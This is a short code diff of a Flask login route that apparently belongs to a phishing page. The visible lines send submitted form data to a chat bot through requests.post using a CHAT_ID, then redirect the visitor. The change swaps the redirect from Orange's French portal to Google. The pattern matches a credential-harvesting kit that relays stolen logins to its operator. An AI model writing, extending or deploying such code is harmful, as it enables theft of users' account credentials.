@@ -22,9 +22,8 @@ def login():
         data = {"chat_id": CHAT_ID, "text": message}
         requests.post(url, data=data)
 
-        return redirect("https://www.orange.fr/portail/")
+        return redirect("https://www.google.com/")
     return render_template("login.html")
 
 if __name__ == "__main__":
     app.run(debug=True)
-
